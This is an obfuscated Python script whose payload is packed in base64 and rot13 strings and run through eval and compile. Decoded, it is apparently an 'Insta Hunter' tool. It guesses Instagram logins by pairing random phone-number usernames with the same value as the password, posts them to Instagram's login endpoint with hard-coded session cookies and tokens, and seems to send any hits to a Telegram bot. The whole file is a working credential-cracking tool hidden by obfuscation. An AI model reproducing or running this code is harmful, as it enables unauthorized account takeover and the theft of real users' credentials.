import base64, codecs
magic = 'aW1wb3J0IHJlcXVlc3RzLCBvcywgcmFuZG9tLCBqc29uLCB0aHJlYWRpbmcsIHNlY3JldHMsIHV1aWQKZnJvbSBjb2xvcmFtYSBpbXBvcnQgRm9yZSwgU3R5bGUKZnJvbSB0aW1lIGltcG9ydCBzbGVlcApmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQpmcm9tIHNlY3JldHMgaW1wb3J0IHRva2VuX2hleApmcm9tIHV1aWQgaW1wb3J0IHV1aWQ0CmZyb20gdXNlcl9hZ2VudCBpbXBvcnQgZ2VuZXJhdGVfdXNlcl9hZ2VudAppbXBvcnQgcHlmaWdsZXQsIHRocmVhZGluZywgc3lzLCB0aW1lLCBweWZpZ2xldAojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpFID0gJ1x4MWJbMTszMW0nCkcgPSAnXHgxYlsxOzMybScKUyA9ICdceDFiWzE7MzNtJwpBID0gJ1x4MWJbMTszNG0nCnJlZCA9ICdceDFiWzE7MzFtJwpYID0gJ1x4MWJbMTszM20nCnJlZDEgPSAnXHgxYlsyOzMxbScKRiA9ICdceDFiWzI7MzJtJwpBID0gJ1x4MWJbMjszOW0nCkMgPSAnXHgxYlsyOzM1bScKQiA9ICdceDFiWzI7MzZtJwpZID0gJ1x4MWJbMTszNG0nCmduID0gMApyZWR4YyA9IDAKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KI2dob3N0cyA9IHB5ZmlnbGV0LmZpZ2xldF9mb3JtYXQoIk1yIEdob3N0IikKI2dob3N0c25ldCA9IHB5ZmlnbGV0LmZpZ2xldF9mb3JtYXQoJ0lOU1RBJykKI2puID0gcHlmaWdsZXQuZmlnbGV0X2Zvcm1hdCgnSFVOVEVSJykKI21lID0gcHlmaWdsZXQuZmlnbGV0X2Zvcm1hdCgnR2hvc3RzIE5ldCcpCiNpaT0oJ1x4MWJbMjszM209JyAqIDYwKQojZmY9KCJceDFiWzI7MzJtICAgICAgICAgICAgV2VsY29tZSBUbyBNeSBJbnN0YSBIdW50ZXIgU2NyaXB0ICIpCiNsbD0oJ1x4MWJbMjszM209JyAqIDYwKQojTXIgR2hvc3QgCiNLaWRzIFNjcmlwdCAKI0dvb2QgRGVjcnlwdAppbXBvcnQgcmVxdWVzdHMsIGpzb24sIHJhbmRvbSwgc3RyaW5nCmZyb20gYnM0IGltcG9ydCBCZWF1dGlmdWxTb3VwCmltcG9ydCBvcywgc3lzLCB3ZWJicm93c2VyLCB0ZXJtY29sb3IsdGltZSxweWZpZ2xldAojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Ka2wgPSBweWZpZ2xldC5maWdsZXRfZm9ybWF0KCdHaG9zdHMgTmV0JykKbWUgPSBweWZpZ2xldC5maWdsZXRfZm9ybWF0KCdJbnN0YScpCmdob3N0cyA9IHB5ZmlnbGV0LmZpZ2xldF9mb3JtYXQoIkh1bnRlciIpCm5ldCA9ICIiIgogXHgxYlswOzMzbURlc2lnbiBCeSA6IE1yIEdob3N0CiAKIFx4MWJbMDszMm1GYWNlYm9vazogaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2dob3N0c25ldDQKIAogXHgxYlswOzM1bVRlbGVncm'
love = 'SgBvObqUEjpmbiY3DhoJHiE2uip3EmGzI0PvNvVvVXpUWcoaDbqTIloJAioT9lYzAioT9lMJDbn2jfVTAioT9lCFWlMJDvXFjtPaEypz1wo2kipv5wo2kipzIxXT1yYPOwo2kipw0vrJIfoT93VvxfPaEypz1wo2kipv5wo2kipzIxXTqbo3A0pljtL29fo3V9VzqlMJIhVvxfqTIloJAioT9lYzAioT9lMJDbozI0YPOwo2kipw0vpzIxVvxcPaOlnJ50XPqprQSvJmN7ZmWgYFptXvN2ZPxXMTImVQ0tVvVvKUtkLyfjBmZ3oFOKMJkwo21yVSEiVSAwpzyjqPOWoaA0LFOVqJ50MKVtDJAwo3IhqPVvVtcjpzyhqPuxMKZcPaOlnJ50XPWprQSvJmN7ZmWgYFVdAwNcPaOlnJ50XPxXpUWcoaDbVyk4ZJWoZQfmZ23Lc9zR2LwMtgzO2Xxt2LYLgqva2X/MugvaVAv12YaLdAvcVAvb2YZt2XCLegvjVAva2LGLeqzPVAv12LoLhqzUVvxXpUWcoaDbXDcjpzyhqPtvKUtkLyfjBmZkoF0vXwLjXDcjpzyhqPtcPvZgYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gPvAxMJLtnvulMJDcBtbwVPNtVTMipvOyVTyhVUWyMQbXVlNtVPNtVPNtp3ymYaA0MT91qP53pzy0MFuyXDbwVPNtVPNtVPOmrKZhp3Exo3I0YzMfqKAbXPxXVlNtVPNtVPNtqTygMF5moTIypPtjYwNlAvxXVl0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0XV2bbpzIxVPftM2uip3EmXDbwnvuUVPftM2uip3EmozI0XDbwnvuGVPftnz4cPvAdXRVtXlOgMFxXV3OlnJ50XTycXDbwpUWcoaDbMzLcPvAjpzyhqPufoPxXV3OlnJ50XPxXVl0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0XFHDtCFOcoaO1qPulMJDtXlNaJlgqVRIhqTIlVSEyoTIapzSgVRyRVQbtKUtkLyflBmZ2oFpcPaOlnJ50XPxXVl0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0XqT9eMJ4tCFNaZGp4ZGZlAwNjAmcODHt5oyIDFGSiG0M0LxEOATt0nUAPqmIKLwuFM3AfZSVgnlpXVl0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0Xp3EupaEsoKAaVQ0tpzIkqJImqUZhpT9mqPuzVzu0qUOmBv8iLKOcYaEyoTIapzSgYz9lMl9vo3E7qT9eMJ59Y3AyozEAMKAmLJqyC2AbLKEsnJD9r0yRsFM0MKu0CFOKMJkwo21yVRqbo3A0VBXLbB+4w+XpuFVcYzcmo24bXDbwYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYDccMS9gp2ptCFOmqTSlqS9gp2qoW3Wyp3IfqPqqJlqgMKAmLJqyK2yxW10XVl0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0g'
god = 'LS0tLS0tLS0tLS0tLS0KZGVmIENvZGVfTVJHSE9TVCgpOgogICAgZ2xvYmFsIHJlZHhjCiAgICBnbG9iYWwgZ24KICAgIHVzZXIgPSAnMTIzNDU2Nzg5MCcKICAgIGggPSBpbnB1dCgnWytdXHgxYlsyOzMybSBDaG9vc2UgTnVtYmVyIFRvIFN0YXJ0IEh1bnRcblxuIChceDFiWzI7MzZtIDAxMCB+IDAxMX4gMDEyIH4gMDE1IH4gMDc3IH4gMDcyIH4gMDc4IH4gMDc1IFx4MWJbMjszMm0pIFxuXG5ceDFiWzI7MzNtWytdIFB1dCBZb3VyIENob29zZSBceDFiWzI7MzVtOiAnKQogICAgcHJpbnQoKQogICAgcHJpbnQoIlx4MWJbMjszMW1bK10gXHgxYlsyOzMybUdvIFRvIFRoZSBUZWxlZ3JhbSBCb3QgSW5zdGEgSHVudGVyICIpCiAgICBOdW1iZXIgPSAwCiAgICB3aGlsZSBUcnVlOgogICAgICAgIHVzID0gc3RyKCcnLmpvaW4oKHJhbmRvbS5jaG9pY2UodXNlcikgZm9yIGkgaW4gcmFuZ2UoOCkpKSkKICAgICAgICB1c2VybmFtZSA9ICcrJyArIGggKyB1cwogICAgICAgIHBzcyA9IGggKyB1cwogICAgICAgIHVybCA9ICdodHRwczovL3d3dy5pbnN0YWdyYW0uY29tL2FjY291bnRzL2xvZ2luL2FqYXgvJwogICAgICAgIGhlYWRlX3ZpcG1yID0geydhY2NlcHQnOicqLyonLCAKICAgICAgICAgJ2FjY2VwdC1lbmNvZGluZyc6J2dyZWRpcCwgZGVmbGF0ZSwgYnInLCAKICAgICAgICAgJ2FjY2VwdC1sYW5ndWFnZSc6J2VuLVVTLGVuO3E9MC45JywgCiAgICAgICAgICdjb250ZW50LWxlbmd0aCc6JzMzMCcsIAogICAgICAgICAnY29udGVudC10eXBlJzonYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkJywgCiAgICAgICAgICdjb29raWUnOidpZ19kaWQ9Njg4NjM2RDEtRjBCRi00NzQ0LTkzNTQtNjEyNzY2QTg5MUMwOyBpZ19ucmNiPTE7IG1pZD1ZTzZxMmdBRUFBSFlSd3VMbFBMS3RKdzVXdi05OyBjc3JmdG9rZW49YUpHYzFMVkhOZGd3NHFmaTRBeU5pUmlscWJiZUFscmVkMycsIAogICAgICAgICAnb3JpZ2luJzonaHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbScsIAogICAgICAgICAncmVmZXJlcic6J2h0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20vJywgCiAgICAgICAgICdzZWMtZmV0Y2gtZGVzdCc6J2VtcHR5JywgCiAgICAgICAgICdzZWMtZmV0Y2gtbW9kZSc6J2NvcnMnLCAKICAgICAgICAgJ3NlYy1mZXRjaC1zaXRlJzonc2FtZS1vcmlnaW4nLCAKICAgICAgICAgJ3NlYy1ncGMnOicxJywgCiAgICAgICAgICd1c2VyLWFnZW50JzonTW9yZWRpbGxhLzUuMCAoV2luZG93cyBOVCA2LjEpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85Mi4wLjQ1MTUuMTA3IFNhZmFyaS81MzcuMzYnLCAKICAgICAgICAgJ3gtYXNiZC1pZCc6JzQzNzgwNicsIAogICAgICAgICAneC1jc3JmdG9rZW4nOidhSkdjMUxWSE5kZ3c0cWZpNE'
destiny = 'S5GzyFnJkkLzWyDJklMJDmWljtPvNtVPNtVPNtVPq4YJyaYJSjpP1cMPp6WmxmAwLkBGp0ZmZ5ZwD1BFpfVNbtVPNtVPNtVPNarP1cMl13q3pgL2kunJ0aBvpjWljtPvNtVPNtVPNtVPq4YJyhp3EuM3WuoF1unzS4WmbaBGL1AzAzL2EvLmtlWljtPvNtVPNtVPNtVPq4YKWypKIyp3EyMP13nKEbWmbaJR1ZFUE0pSWypKIyp3E9W30XVPNtVPNtVPOxLKEuK3McpT1lVQ0trlq1p2IlozSgMFp6qKAypz5uoJHfVNbtVPNtVPNtVPNaMJ5wK3Oup3A3o3WxWmbaV1OKES9WGyAHDHqFDH1sDyWCI1ASHwbkZQbkAwV3AQx5ZwxmBag9Wl5zo3WgLKDbpUAmXFjtPvNtVPNtVPNtVPqkqJIlrIOupzSgplp6W3g9WljtPvNtVPNtVPNtVPqipUEWoaEiG25yITSjWmbaMzSfp2HasDbtVPNtVPNtVTEuVQ0tpzIkqJImqUZhpT9mqPu1pzjfVTuyLJEypaZ9nTIuMTIsqzyjoKVfVTEuqTR9MTS0LI92nKOgpvxhqTI4qNbtVPNtVPNtVTyzVPq1p2IlFJDaVTyhVTEuBtbtVPNtVPNtVPNtVPOaovNeCFNkPvNtVPNtVPNtVPNtVUOlnJ50XRptXlOzVvOoVUgBqJ1vMKW9VvNeVPq8WlNeVRptXlNaIIZtBvNaVPftqKAypz5uoJHtXlNaBvOjLKAmVQbaVPftpUAmVPftWlNtKT5sWlxXVPNtVPNtVPNtVPNtq2y0nPOipTIhXPqVFIEGYaE4qPpfVPquWlxtLKZtXUtcBtbtVPNtVPNtVPNtVPNtVPNtrP53pzy0MFu1plNeVPqpovpcPvNtVPNtVPNtVPNtVPNtVPO0oTptCFOzVzu0qUOmBv8iLKOcYaEyoTIapzSgYz9lMl9vo3E7qT9eMJ59Y3AyozEAMKAmLJqyC2AbLKEsnJD9r0yRsFM0MKu0CFOBMKptDJAwo3IhqSkhKT4gVCPqxWGjaMPF8W2DuCPqxWRt4c6dVRO7qKAypz5uoJI9VBXpx1khYFQjaMPC8W2DtCPqxWYjaMPFVBXrdvO7pUAmsFOpohXHtrXHtrXHtrXHtrXHtrXHtrXHtrXHtrXHtrXHtrXHtrXHtrXHtIkhVtbtVPNtVPNtVPNtVPNtVPNtpzIkVQ0tpzIkqJImqUZhpT9mqPu0oTpcPvNtVPNtVPNtMJkmMGbXVPNtVPNtVPNtVPNtpzIxrTZtXm0tZDbtVPNtVPNtVPNtVPOlMKS1MKA0pl5jo3A0XTLvnUE0pUZ6Yl9upTxhqTIfMJqlLJ0ho3WaY2WiqUg0o2gyoa0iMJEcqT1yp3AuM2I0MKu0C2AbLKEsnJD9r0yRsFMgMKAmLJqyK2yxCKgcMS9gp2q9WaEyrUD94cvi77vCVSqyoTAioJHtE2uip3DtIT8tGKxtDz90VRyhp3EuVRu1oaEypvQvzXQihV/ja5FyKT5povN9CG09CG09CG09CG09CG09CG09CG09CG09KT5pohXLe++4wlOVLJAeMJDtJ3gaoa1qVBXpuFOpoykh4cvi77vCVR5iqPOVLJAeMJDtJ3glMJE4L31qVBXqwSkhKT49CG09CG09CG09CG09CG09CG09CG09CG09KT5pohXLe++4wlOIp2IlVQbt4clm77vCVUg1p2IlozSgMK0t4cl077vCKT5pohXLe++4wlODLKAmVQbt4clm77vCVUgjp3A9VBXpgB+4w1khKT49CG09CG09CG09CG09CG09CG09CG09CG09KT4vXDbXD29xMI9AHxqVG1AHXPx='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))